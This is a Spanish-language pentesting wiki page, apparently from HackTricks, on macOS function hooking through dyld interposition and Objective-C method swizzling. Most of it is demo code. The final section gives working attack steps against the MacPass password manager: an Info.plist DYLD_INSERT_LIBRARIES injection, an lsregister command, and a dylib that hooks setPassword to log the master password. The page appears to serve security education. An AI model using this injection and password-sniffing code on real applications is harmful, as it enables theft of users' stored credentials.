# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Interposición de Funciones

Crea un **dylib** con una sección **`__interpose` (`__DATA___interpose`)** (o una sección marcada con **`S_INTERPOSING`**) que contenga tuplas de **punteros de función** que se refieran a las funciones **original** y **reemplazo**.

Luego, **inyecta** el dylib con **`DYLD_INSERT_LIBRARIES`** (la interposición debe ocurrir antes de que se cargue la aplicación principal). Obviamente, las [**restricciones** aplicadas al uso de **`DYLD_INSERT_LIBRARIES`** también se aplican aquí](macos-library-injection/#check-restrictions).

### Interponer printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> La variable de entorno **`DYLD_PRINT_INTERPOSTING`** se puede usar para depurar la interposición y mostrará el proceso de interposición.

También tenga en cuenta que **la interposición ocurre entre el proceso y las bibliotecas cargadas**, no funciona con la caché de bibliotecas compartidas.

### Interposición Dinámica

Ahora también es posible interponer una función dinámicamente utilizando la función **`dyld_dynamic_interpose`**. Esto permite interponer programáticamente una función en tiempo de ejecución en lugar de hacerlo solo desde el principio.

Solo es necesario indicar las **tuplas** de la **función a reemplazar y la función de reemplazo**.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
## Method Swizzling

En ObjectiveC, así es como se llama a un método: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Se necesita el **objeto**, el **método** y los **params**. Y cuando se llama a un método, se envía un **msg** utilizando la función **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

El objeto es **`someObject`**, el método es **`@selector(method1p1:p2:)`** y los argumentos son **value1**, **value2**.

Siguiendo las estructuras de objetos, es posible acceder a un **array de métodos** donde se **ubican** los **nombres** y **punteros** al código del método.

> [!CAUTION]
> Tenga en cuenta que, dado que los métodos y clases se acceden en función de sus nombres, esta información se almacena en el binario, por lo que es posible recuperarla con `otool -ov </path/bin>` o [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Accessing the raw methods

Es posible acceder a la información de los métodos, como el nombre, el número de params o la dirección, como en el siguiente ejemplo:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Intercambio de métodos con method_exchangeImplementations

La función **`method_exchangeImplementations`** permite **cambiar** la **dirección** de la **implementación** de **una función por la otra**.

> [!CAUTION]
> Así que cuando se llama a una función, lo que se **ejecuta es la otra**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> En este caso, si el **código de implementación del método legítimo** **verifica** el **nombre del método**, podría **detectar** este swizzling y evitar que se ejecute.
>
> La siguiente técnica no tiene esta restricción.

### Swizzling de Métodos con method_setImplementation

El formato anterior es extraño porque estás cambiando la implementación de 2 métodos uno por el otro. Usando la función **`method_setImplementation`** puedes **cambiar** la **implementación** de un **método por el otro**.

Solo recuerda **almacenar la dirección de la implementación del original** si vas a llamarlo desde la nueva implementación antes de sobrescribirlo, porque después será mucho más complicado localizar esa dirección.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Metodología de Ataque por Hooking

En esta página se discutieron diferentes formas de enganchar funciones. Sin embargo, involucraron **ejecutar código dentro del proceso para atacar**.

Para hacer eso, la técnica más fácil de usar es inyectar un [Dyld a través de variables de entorno o secuestro](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Sin embargo, supongo que esto también podría hacerse a través de [inyección de proceso Dylib](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

Sin embargo, ambas opciones están **limitadas** a binarios/procesos **no protegidos**. Revisa cada técnica para aprender más sobre las limitaciones.

Sin embargo, un ataque de hooking de funciones es muy específico, un atacante hará esto para **robar información sensible desde dentro de un proceso** (si no, simplemente harías un ataque de inyección de proceso). Y esta información sensible podría estar ubicada en aplicaciones descargadas por el usuario, como MacPass.

Así que el vector del atacante sería encontrar una vulnerabilidad o eliminar la firma de la aplicación, inyectar la variable de entorno **`DYLD_INSERT_LIBRARIES`** a través del Info.plist de la aplicación añadiendo algo como:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
y luego **volver a registrar** la aplicación:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Agrega en esa biblioteca el código de hooking para exfiltrar la información: Contraseñas, mensajes...

> [!CAUTION]
> Ten en cuenta que en versiones más recientes de macOS, si **eliminaste la firma** del binario de la aplicación y se ejecutó previamente, macOS **no ejecutará la aplicación** más.

#### Ejemplo de biblioteca
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Referencias

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{{#include ../../../banners/hacktricks-training.md}}
